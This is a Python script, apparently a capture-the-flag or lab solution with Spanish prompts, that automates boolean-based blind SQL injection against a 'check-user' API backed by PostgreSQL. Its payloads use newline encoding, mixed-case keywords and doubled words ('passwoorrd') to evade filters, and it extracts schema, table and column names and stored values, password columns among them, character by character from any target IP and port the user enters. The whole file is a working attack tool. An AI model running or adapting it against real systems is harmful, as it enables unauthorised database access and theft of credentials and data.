import requests
import json


def enumerate(payload_1,payload_2,payload_3,entrada,IP_Port):
	wordlist = "$abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@_-.^#!%"
	resultado = ""
	schema_n_caracteres = []
	schemas = []
	for i in range(1,15):
		respuesta1 = requests.get(f"http://{IP_Port}/api/v1/check-user?u="+f"{payload_1}{i}%0ALiMiT%0A1--t")
		if (json.loads(respuesta1.text))["exists"] == True:
			n_tablas = i
			break

	for j in range(0,n_tablas):
        	for h in range(0,70):
                	respuesta2 = requests.get(f"http://{IP_Port}/api/v1/check-user?u="+f"{payload_2}{j})={h}%0ALiMiT%0A1--t")
                	if (json.loads(respuesta2.text))["exists"] == True:
                        	schema_n_caracteres.append(h)
                        	break

	contador = 0
	for i in schema_n_caracteres:
        	resultado = ""
        	for l in range(1,i+1):
                	for j in wordlist:
                        	respuesta = requests.get(f"http://{IP_Port}/api/v1/check-user?u={payload_3}"+f"{contador}),{l},1)='{j}'%0ALiMiT%0A1--t")
                        	dict_1 = json.loads(respuesta.text)
                        	if dict_1["exists"] == True:
                                	resultado += j
                                	break
        	schemas.append(resultado)
        	contador +=1
	schemas_1 = ','.join(schemas)
	if entrada == 'C':
		print(f"Los nombres de las columnas son: {schemas_1}")
	if entrada == 'T':
		print(f"Los nombres de las tablas son: {schemas_1}")
	if entrada == 'S':
		print(f"Los nombres de los schemas son: {schemas_1}")
	if entrada == 'D':
		print(f"Los valores almacenados en la columna son: {schemas_1}")

IP_Port = input("Digite la IP y el numero de puerto del sistema objetivo, separados por el caracter ':' y en el orden indicado: ")
while(True):
	entrada = input("Si desea saber las schemas de la base de datos actual, digite 'S'.\n\rSi desea saber las tablas de un schema, digite 'T'.\n\rSi desea saber las columnas de una tabla, digite 'C'.\n\rSi desea saber los valores almacenados en una columna, digite 'D'.\n\rDigite su entrada: ")
	if entrada == 'C':
		entrada_1 = input("Digite el nombre de la tabla y del esquema al que pertenece separados por una coma y en el orden indicado: ")
		entrada_2 = entrada_1.split(',')
		payload_1 = f"'%0AOr%0A(SELeCt%0ACoUnT(attname)%0AFrOm%0Apg_attribute%0AWhErE%0Aattrelid%0A=%0A'{entrada_2[1]}.{entrada_2[0]}'::regclass%0AAnD%0Aattnum%0A>%0A0)="
		payload_2 = f"'%0AOr%0A(SELeCt%0ALeNgTh(attname)%0AFrOm%0Apg_attribute%0AWhErE%0Aattrelid%0A=%0A'{entrada_2[1]}.{entrada_2[0]}'::regclass%0AAnD%0Aattnum%0A>%0A0%0ALiMiT%0A1%0AOfFsET%0A"
		payload_3 = f"'%0AOr%0ASUBSTR((SELeCt%0Aattname%0AFrOm%0Apg_attribute%0AWhErE%0Aattrelid%0A='{entrada_2[1]}.{entrada_2[0]}'::regclass%0AAnD%0Aattnum%0A>%0A0%0ALiMiT%0A1%0AOfFsET%0A"
		enumerate(payload_1,payload_2,payload_3,entrada,IP_Port)
	if entrada == 'T':
		entrada_1 = input("Digite el nombre del schema donde pertenece la tabla: ")
		payload_1 = f"'%0AOr%0A(SELeCt%0ACoUnT(tablename)%0AFrOm%0Apg_tables%0AWhErE%0Aschemaname%0A=%0A'{entrada_1}')="
		payload_2 = f"'%0AOr%0A(SELeCt%0ALeNgTh(tablename)%0AFrOm%0Apg_tables%0AWhErE%0Aschemaname%0A=%0A'{entrada_1}'%0ALiMiT%0A1%0AOfFsET%0A"
		payload_3 = f"'%0AOr%0ASUBSTR((SELeCt%0Atablename%0AFrOm%0Apg_tables%0AWhErE%0Aschemaname%0A='{entrada_1}'%0ALiMiT%0A1%0AOfFsET%0A"
		enumerate(payload_1,payload_2,payload_3,entrada,IP_Port)
	if entrada == 'S':
        	payload_1 = f"'%0AOr%0A(SELeCt%0ACoUnT(nspname)%0AFrOm%0Apg_namespace)="
        	payload_2 = f"'%0AOr%0A(SELeCt%0ALeNgTh(nspname)%0AFrOm%0Apg_namespace%0ALiMiT%0A1%0AOfFsET%0A"
        	payload_3 = f"'%0AOr%0ASUBSTR((SELeCt%0Anspname%0AFrOm%0Apg_namespace%0ALiMiT%0A1%0AOfFsET%0A"
        	enumerate(payload_1,payload_2,payload_3,entrada,IP_Port)
	if entrada == 'D':
		entrada_1 = input("Digite el nombre de la columna y de la tabla a que pertenece separados por una coma y en el orden indicado: ")
		entrada_2 = entrada_1.split(',')
		if entrada_2[0] == "password":
			entrada_2[0] = "passwoorrd"
		if entrada_2[0] == "created_at":
			entrada_2[0] = "creacreatedted_at"
		payload_1 = f"'%0AOr%0A(SELeCt%0ACoUnT({entrada_2[0]})%0AFrOm%0A{entrada_2[1]})="
		payload_2 = f"'%0AOr%0A(SELeCt%0ALeNgTh({entrada_2[0]})%0AFrOm%0A{entrada_2[1]}%0ALiMiT%0A1%0AOfFsET%0A"
		payload_3 = f"'%0AOr%0ASUBSTR((SELeCt%0A({entrada_2[0]})%0AFrOm%0A{entrada_2[1]}%0ALiMiT%0A1%0AOfFsET%0A"
		enumerate(payload_1,payload_2,payload_3,entrada,IP_Port)
